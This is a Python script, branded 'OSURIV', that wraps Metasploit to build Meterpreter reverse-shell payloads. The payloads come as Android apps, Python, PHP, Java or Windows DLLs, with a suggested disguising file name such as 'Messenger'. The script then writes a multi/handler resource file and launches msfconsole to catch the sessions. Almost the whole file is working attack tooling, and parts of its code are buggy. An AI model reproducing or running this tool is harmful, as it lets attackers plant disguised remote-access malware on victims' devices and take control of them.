from ftplib import FTP
import os
import platform
S10 = '\033[95m'
S11 = '\033[94m'
S12 = '\033[92m'
S13 = '\033[93m'
S14 = '\033[91m'
S15 = '\033[0m'
S16 = '\033[33m'
S17 = '\033[92m'
def clear(numlines=100):
  if os.name == "posix":
    print('\n' * numlines)
    os.system('clear')
  elif os.name in ("nt", "dos", "ce"):
    print('\n' * numlines)
    os.system('CLS')
  else:
    print('\n' * numlines)
clear()
print(S10+'choose Payload:')
print(S11+'')
print('1-Android(.apk)')
print('2-Python(.py)')
print('3-Php(.php)')
print('4-Java(.js)')
print('5-Win x64(.dll)')
print('6-Win x86(.dll)')
print('\x1bc')
print('\x1bc')
try:
    va = input(S12+'OSURIV~ $ ')
    print('\x1bc')
    print('\x1bc')
    print('\x1bc')
except:
    error()
if va == ('1'):
    payload = ('android/meterpreter/')
    option = ('')
    payext = ('.apk')
if va == ('2'):
    payload = ('python/meterpreter/')
    option = ('')
    payext = ('.py')
if va == ('3'):
    payload = ('php/meterpreter/')
    option = ('')
    payext = ('.php')
if va == ('4'):
    payload = ('java/meterpreter/')
    option = ('')
    payext = ('.js')
if va == ('5'):
    payload = ('windows/meterpreter/')
    option = (' -ax86 -f dll')
    payext = ('.dll')
if va == ('6'):
    payload = ('windows/x64/meterpreter/')
    option = (' -ax64 -f dll')
    payext = ('.dll')
if va == ('') or va == ('7') or va == (' ') or va == ('0'):   
    print(S17+'You have to choose an option.')
    exit()
clear()
print(S13+'choose methode:')
print('')
print(S17+'1-reverse_tcp')
print('2-reverse_http')
print('3-reverse_https')
print('\x1bc')
print('\x1bc')
try:
    vr = input(S14+'OSURIV~ $ ')
    print('\x1bc')
    print('\x1bc')
    print('\x1bc')
except:
    error()
if vr == ('1'):
    methode = ('reverse_tcp')
if vr == ('2'):
    methode = ('reverse_http')
if vr == ('3'):
    methode = ('reverse_https')
if vr == ('') or vr == ('4') or vr == (' ') or vr == ('0'):
    print(S10+'You have to chose an option.')
    exit()
def Menu3():
    print(S15+"Downloding Metasploit installer")
    os.system("curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall")
    Msfinstaller()
def Msfinstaller():
    try:
        clear()
        print('If its not working type this:')
        print(S13+'     chmod +x msfinstall')
        print('     ./msfinstall')

        print(S15+'')
        print('')
        print('')
        vl == input(S10+'OSURIV~ $ ')
    except:
        print('@')
        exit()
    if  vl == ('') or vl == ('ok'):
        print('@')
        print('Lunching Metasploit Installer')
        os.system("chmod +x msfinstall")
        os.system("./msfinstall")
        print('If is not working type these command manualy')
        print('     chmod +x msfinstall')
        print('     ./msfinstall')
        exit()

    else:
        print('@')
        exit()

def Menu1():
    clear()
    print(S16+'enter the host')
    print('\x1bc')
    print('\x1bc')
    cmd1 = input('OSURIV~ $ ')
    clear()
    print(S14+'enter the port')
    print('\x1bc')
    print('\x1bc')
    cmd2 = input('OSURIV~ $ ')
    clear()
    print(S10+'enter the file name Ex: Messenger')
    print('\x1bc')
    print('\x1bc')
    cmd3 = input('OSURIV~ $ ')
    clear()
    msfvenom = ('msfvenom -p '+ payload+methode+option+' LHOST=' + cmd1 + ' LPORT=' + cmd2 +' -o '+ cmd3 + payext)
    os.system(msfvenom)
    plugin = ("use multi/handler\nset payload "+payload+methode+"\nset lhost "+ cmd1 +"\nset lport "+ cmd2 +"\nrun -z\nrun -z\nrun -z\nrun -z\nrun -z")
    f = open("pluginrc", "w")
    f.write(plugin)
    f.close()
    print('\x1bc')
    print('\x1bc')
    try:
        v = input(S11+'Continue...')
        print('\x1bc')
        print('\x1bc')
    except:
        Main2()
    if v == ('') or v == ('ok'):
        Main2()
    else:
        Main2()
    Main2()
    exit()


def Menu2():
    msfconsole = ('msfconsole -r pluginrc')
    os.system(msfconsole)
    exit()

def error():
    clear()
    try:
        v = input(S12+'not a good answer...')
        print('\x1bc')
        print('\x1bc')
    except:
        Main2()
    if v == ('') or v == ('ok'):
        Main2()
    else:
        Main2()
def Main():
        Main2()



def Main2():

    clear()
    print('')
    print(S13+'Chose whats you wanna do:')
    print('\x1bc')
    print(S14+'1-Make the injected APP')
    print('2-Run the Meterpreter')
    print('3-Install Metasploit(Needed)')
    print('\x1bc')
    print('\x1bc')
    try:
        v = input(S15+'OSURIV~ $ ')
    except v == 'exit':
        exit()
        error()
    if v == '3':
        print('Metasploit Installer')
        Menu3()
    if v == '1':
        print('APP + Payload Creator')
        Menu1()
    if v == '2':
        print('The Metasploit is starting')
        Menu2()
    else:
        print(S16+''+v+' is not an anwser!')
        v = input(S17+'Press')
        Main2()
Main()
Main2()
error()
